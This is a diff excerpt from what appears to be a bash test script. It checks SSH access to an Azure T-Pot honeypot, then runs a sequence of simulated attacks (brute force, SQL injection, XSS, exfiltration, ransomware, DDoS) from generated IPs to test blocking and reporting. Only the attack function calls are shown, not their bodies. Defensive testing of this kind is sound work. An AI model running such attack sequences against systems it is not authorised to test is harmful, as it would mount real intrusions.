+        if ! timeout 20 ssh -i "$TPOT_SSH_KEY" -p "$TPOT_SSH_PORT" -o StrictHostKeyChecking=no -o ConnectTimeout=15 azureuser@"$TPOT_IP" "echo test" >/dev/null 2>&1; then
+            print_warning "Cannot SSH to Azure T-Pot - blocking verification will be skipped"
+            ENABLE_BLOCKING_VERIFICATION=false
+        else
+            print_success "Azure T-Pot SSH access verified"
+        fi
+    fi
+    
+    echo ""
+    read -p "Press Enter to start the comprehensive attack test or Ctrl+C to cancel..."
+    echo ""
+    
+    # Generate attacker IPs
+    if [ "$ENABLE_FULL_TEST" = true ]; then
+        generate_attacker_ips 10
+    else
+        generate_attacker_ips 5
+    fi
+    
+    # Run all attack patterns
+    local ip_index=0
+    for attacker_ip in "${ATTACKER_IPS[@]}"; do
+        case $ip_index in
+            0) attack_ssh_brute_force "$attacker_ip" ;;
+            1) attack_password_spray "$attacker_ip" ;;
+            2) attack_sql_injection "$attacker_ip" ;;
+            3) attack_xss "$attacker_ip" ;;
+            4) attack_path_traversal "$attacker_ip" ;;
+            5) attack_malware "$attacker_ip" ;;
+            6) attack_data_exfiltration "$attacker_ip" ;;
+            7) attack_port_scan "$attacker_ip" ;;
+            8) attack_ddos "$attacker_ip" ;;
+            9) attack_apt_chain "$attacker_ip" ;;
+        esac
+        ((ip_index++))
+        sleep 2
+    done
+    
+    # Additional attacks if full test enabled
+    if [ "$ENABLE_FULL_TEST" = true ] && [ ${#ATTACKER_IPS[@]} -gt 10 ]; then
+        attack_credential_harvest "${ATTACKER_IPS[10]}"
+        attack_ransomware "${ATTACKER_IPS[11]}"
+    fi
+    
+    # Wait for final processing
+    print_info "Waiting for final event processing..."
+    sleep 10
+    
+    # Generate comprehensive report
+    generate_report
+}
+
+# Run main function
+main "$@"
+
